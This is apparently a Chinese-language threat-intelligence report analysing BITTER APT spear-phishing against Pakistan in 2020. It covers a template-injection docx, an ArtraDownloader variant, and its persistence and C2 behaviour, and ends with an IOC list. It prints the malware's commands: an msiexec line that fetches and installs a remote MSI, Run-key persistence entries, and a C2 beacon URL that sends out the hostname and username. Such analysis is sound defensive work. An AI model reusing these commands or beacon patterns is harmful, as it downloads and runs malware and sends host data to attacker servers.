BITTER组织是一个长期针对亚洲国家进行攻击活动的APT组织，并且其还曾被发现对沙特阿拉伯进行攻击，由于初期该组织的特码数据包头部以“BITTER”作为标识，因此命名为“BITTER”，在国内其还有其他的名称如蔓灵花、APT-C-08、T-APT-17、苦象等名称。该组织主要针对政府、军工、电力和核工业等行业进行攻击，从2019年开始，该组织对我国相关进出口行业加强了攻击，窃取敏感资料。

样本分析
深信服安全团队近期捕捉到BITTER组织针对巴基斯坦地区的相关样本，本次捕捉到的样本为该组织惯用的下载样本，通过鱼叉攻击发送恶意的模板注入docx文件，docx下载恶意漏洞模板并执行。例如“Guidelines for Extension of official-Gratis Passports.docx”(免费提供的官方护照延期指南.docx)
漏洞模板文件为公式编辑器漏洞文件
下载的rgn文件编译于2020.06.06 15:34:12，保存于c:\rgn\rgn.exe，该文件为该组织曾使用过的下载器变种木马
本次攻击活动中发现的另一例msi恶意文件，该样本同样利用docx模板注入技术下载公式漏洞模板文件，将“msiexec /i http://www.bheragreens.com/img/winsupdater.msi” 执行命令写入runonece注册表，完成病毒下载执行
该恶意msi文件打包了恶意文件wnupdte.exe
提取其中的wnupdte.exe病毒文件，其编译时间为2020年1月6日19:10:40，通过分析可以确认该病毒为ArtraDownloader v1变种。
其存在一个对话框资源，名称为“About ESET-Dwn”
对该病毒进行分析，其首先会从字符串资源中获取窗体的窗口名称(ESET-Dwn)和窗口类名(ESETDWN)
通过获取的名称，创建一个窗体
接着该病毒会对加密的字符串进行解密，解密方式有两种，一种是直接加5，另一种是加上循环变量加1，其中C2解密为mia.alkhaleejpk.info
接着其会检测进程“winupdt”（检测自身是否存在）和“avpui”(kaspersky相关文件)进程是否存在，“winupdt”进程不存在，拷贝自身到sendto目录。
如果“avpui”进程存在，其会通过设置注册表启动项用于驻留(“%tempf%”环境变量指向自身复制的文件）
注册表键名称
HKCU\Enviorment tempf C:\Users\%username%\AppData\Roaming\Microsoft\Windows\SendTo\winupdta.exe
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run tempf cmd /c start %tempf% && exit
如果“avpui”进程不存在，会在开始菜单目录下放置winup.lnk快捷方式文件驻留（lnk文件指向自身复制的文件winupdt.exe）。
接下来其会获取主机的基本信息，主机名、用户名、操作系统名称
按照以下格式进行拼接，采用$进行分割
http://mia.alkhaleejpk.info/PsehestyvuPw/F1l3estPhPInf1.php?info=Test$WIN-P01LA5VOT7J$admin$Windows7Ultimate-$-$WIN-P01LA5VOT7Jadmin
get请求信息 描述
xxxx.php 请求的php路径，被加密在文件中
变量1 Info=Test，硬编码在文件中
变量2 机器名(通常和主机名一样)
变量3 用户名
变量4 操作系统名+“-”
变量5 空置
变量6 机器名+用户名
该病毒发起的相关get请求流量，将获取的基本信息上传到C2
创建信号量“error”
接下来会检测返回数据，是否存在下载执行任务，如果存在下载执行任务，下载文件写入并通过ShellExecuteA执行下载的文件

溯源分析
通过对C2的分析，可以看到在2020年01月时，已经有相关攻击活动出现了，本次攻击活动主要集中在2020年6月到2020年10月左右。
同域名下存在另一个C2，mi.alkhaleejpk.info, 这两个域名都解析到82.221.136.4
继续分析C2，发现该地址疑似为该组织的后台管理地址，通过设置windows背景图来隐藏登录界面，符合该组织近期的后台变化情况
该页面登录源码如下
分析该病毒文件，其被托管在bheragreens.com/img/winsupdater.msi
该网站为巴基斯坦私人住房协会相关的公司网站，其主要负责一些建筑建设、基础设施建设等，被入侵用于托管恶意文件
liveways.pk为巴基斯坦相关的托管服务和IT基础架构解决方案提供商，官网被入侵用于托管恶意软件
另外通过该下载器请求特征以及相关文件特征，我们可以确认该下载器为ArtradDownloader v1的变种，该变种的特征一直在进行变化,通过分析，还发现请求为info=ssss，使用‘@’进行分割的变种文件
从攻击样本提交区域和托管恶意文件网站处于巴基斯坦分析，可以确定本次攻击活动为BITTER组织在2020年6月到2020年10月对巴基斯坦的相关攻击活动。

IOC
C2:
mi.alkhaleejpk.info
mia.alkhaleejpk.info
www.bheragreens.com/img/winsupdater.msi
http://liveways.pk/images/rgnd
http://liveways.pk/images/rgn
box.livevideosonlinepk.com
82.221.136.4
Hash:
f5b87d9800aeb64d92dafd758f1d642b (Guidelines for Extension of official-Gratis Passports.docx)
65be1e3712805bb0356f7e85c861f924 (rgnd)
808849de500179ec0fbc82c862f62333 (rgn、wnupdte.exe)
d30d19062bc6668e856946c63b6e9218 (winsupdater.msi）
df0cd6ac04f08a3c46546bc238dbacb1 (rt.msi)
761570587a2f92eea1512ff159ccef29 (rt.msi)
d3204365e948370998afdf6e903c7948 (e739.msi)
17e06d7e7789c6feaf41eb6be7885d62 (wnupdte.exe）
de6457c8bbb8e46154eec6b34d8d758a (wnupdte.exe）
72af5d72af656a593a6607554b7d25dd (wnupdte.exe）
5f63cc9905e26cfc18c14720ea02c158 (wnupdte.exe)